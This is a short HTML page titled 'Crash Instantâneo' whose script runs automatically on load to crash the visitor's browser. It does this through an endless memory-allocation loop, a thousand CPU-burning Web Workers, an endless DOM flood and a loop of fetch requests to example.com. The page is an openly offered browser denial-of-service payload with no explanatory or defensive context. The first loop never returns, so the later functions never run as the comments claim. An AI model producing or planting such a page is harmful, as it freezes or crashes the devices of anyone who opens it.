<!DOCTYPE html>
<html>
<head>
    <title>Crash Instantâneo</title>
</head>
<body>
    <script>
        // 1. Loop infinito de alocação de memória
        function memoryCrash() {
            while (true) {
                const arr = new Array(1000000).fill(new Float32Array(1000));
            }
        }

        // 2. Workers para sobrecarregar CPU
        function cpuCrash() {
            const blob = new Blob(['while(true){for(let i=0;i<1000000;i++){Math.sin(i);}}'], { type: 'text/javascript' });
            const url = URL.createObjectURL(blob);
            for (let i = 0; i < 1000; i++) {
                new Worker(url);
            }
        }

        // 3. Sobrecarga DOM
        function domCrash() {
            while (true) {
                for (let i = 0; i < 1000; i++) {
                    const div = document.createElement('div');
                    div.style.width = '100px';
                    div.style.height = '100px';
                    document.body.appendChild(div);
                }
            }
        }

        // 4. Requisições de rede simultâneas
        function networkCrash() {
            while (true) {
                fetch('https://example.com', { mode: 'no-cors' }).catch(() => {});
            }
        }

        // Executar tudo simultaneamente
        memoryCrash();
        cpuCrash();
        domCrash();
        networkCrash();
    </script>
</body>
</html>
